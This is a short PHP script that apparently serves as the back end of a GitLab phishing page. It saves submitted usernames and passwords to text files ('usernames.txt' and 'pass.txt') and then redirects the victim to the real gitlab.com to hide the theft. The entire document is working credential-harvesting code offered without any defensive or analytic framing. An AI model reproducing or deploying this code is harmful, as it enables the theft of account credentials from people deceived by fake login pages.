<?php

file_put_contents("usernames.txt", "Gitlab Username : " . $email = $_POST['login'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Gitlab Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://gitlab.com');
?>
